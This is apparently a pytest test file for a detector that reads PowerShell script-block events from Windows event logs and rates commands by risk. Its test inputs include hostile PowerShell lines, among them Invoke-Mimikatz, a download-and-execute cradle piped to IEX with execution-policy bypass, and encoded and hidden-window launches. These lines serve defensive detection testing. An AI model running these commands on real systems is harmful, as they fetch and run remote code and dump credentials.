import prototype
import pytest

# This function iterates through the evtx file created and checks it for the command, 
# the id and time. Afterwards, it checks if the command is part of suspicious commands rulebook

# To check the function, the test bellow were created.
# fake_event creates a fake log taken from real data when a startup is made
# However, some areas of the log have been taken out for brevity and simplicity, they however do not affect the script in any way.

# Creating the file
def fake_event(cmd,time='"2026-10-09 10:43:19.7561195Z"',record=0):
    return f'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="" /> 
  <EventID>4104</EventID> 
  <Version>1</Version> 
  <Level>5</Level> 
  <Task>2</Task> 
  <Opcode>15</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime={time}></TimeCreated> 
  <EventRecordID>{record}</EventRecordID> 
  <Correlation ActivityID="" /> 
  <Execution ProcessID="6580" ThreadID="4404" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DISWIN</Computer> 
  <Security UserID="S-1-5-21-3500129868-682983649-275317999-1000" /> 
  </System>
  <EventData>
  <Data Name="MessageNumber">1</Data> 
  <Data Name="MessageTotal">1</Data> 
  <Data Name="ScriptBlockText">{cmd}</Data> 
  <Data Name="ScriptBlockId">b9eb11f9-9172-4fe6-ac10-f01576e29413</Data> 
  <Data Name="Path" /> 
  </EventData>
  </Event>'''

# Creating the fake log, and monkeypatching it so it runs test version instead of real version
@pytest.fixture
def fake_log(monkeypatch):
    # XML strin goes through this list
    events = []

    # runs fake xml instead of real one
    class FakeRecord:
        def __init__(self, xml_text):
            self._xml = xml_text
        def xml(self):
            return self._xml
    # runs the fake version of evtx
    class  FakeEvtx:
        def __init__(self,path):
            pass
        def __enter__(self):
            return self
        # if it fails, shows why
        def __exit__(self, *args):
            return False
        def records(self):
            return[FakeRecord(e) for e in events]

    monkeypatch.setattr(prototype, "Evtx", FakeEvtx)
    monkeypatch.setattr(prototype, "evtx_file", lambda *args, **kwargs:None)
    return events


# first, checking the all the variables gain the correct values by testing a known trigger
def test_encoded(fake_log):
    fake_log.append(fake_event("powershell -enc SGHSAavJyq"))

    result = prototype.pattern_reader()

    assert len(result) == 1
    assert result[0]["Risk Level"] == "High"
    assert result[0]["Category"] == "Command was Encoded"
    assert result[0]["Command"] == "powershell -enc SGHSAavJyq" 
    assert result[0]["Event ID"] == "0"
    assert result[0]["Timestamp (UTC)"] == "2026-10-09 10:43:19"

# test multiple commands, including ones that create a high risk score from multiple rules in one command
@pytest.mark.parametrize("command, expected_risk",
                         [("Invoke-Mimikatz", "High"),
                          ('powershell -exec Bypass -NoProfile -c "(New-Object Net.WebClient).DownloadString("https://testexample.co") | IEX', 'High'),
                          ("Powershell -WindowStyle Hidden", "Medium"),
                          ('iex(New-Object Net.WebClient).DownloadString("https://testexample.co"); Invoke-Mimikatz -Command privilege::debug', 'High')                         
                         ])
def test_risk_score(fake_log, command, expected_risk):
    fake_log.append(fake_event(command))
    result = prototype.pattern_reader()

    assert result[0]["Risk Level"] == expected_risk

# Test non suspicious code
def test_non_suspicious_code(fake_log):
    fake_log.append(fake_event("cd .\\Users\\vboxuser\\Desktop\\Final"))
    assert prototype.pattern_reader() == []

# Test multipe logs, some suspicious some not, script should only bring back suspicious one
def test_multiple(fake_log):
    fake_log.append(fake_event("cd .\\Users\\vboxuser\\Desktop\\Final",record= 1))
    fake_log.append(fake_event("powershell -enc SGHSAavJyq",record= 2))
    fake_log.append(fake_event("Get-Date",record= 3))

    result = prototype.pattern_reader()

    assert len(result) == 1
    assert result[0]["Event ID"] == "2"

# Test empty log
def test_empty(fake_log):
    fake_log.append(fake_event(""))
    assert prototype.pattern_reader() == []

# Test no time and no event id
def test_no_time_no_id(fake_log):
    fake_log.append(fake_event("powershell -enc SGHSAavJyq", time="",record=""))

    assert prototype.pattern_reader()[0]["Category"] == "Command was Encoded"
    assert prototype.pattern_reader()[0]["Timestamp (UTC)"] == "unknown"
    assert prototype.pattern_reader()[0]["Event ID"] == "unknown"


# All tests have passed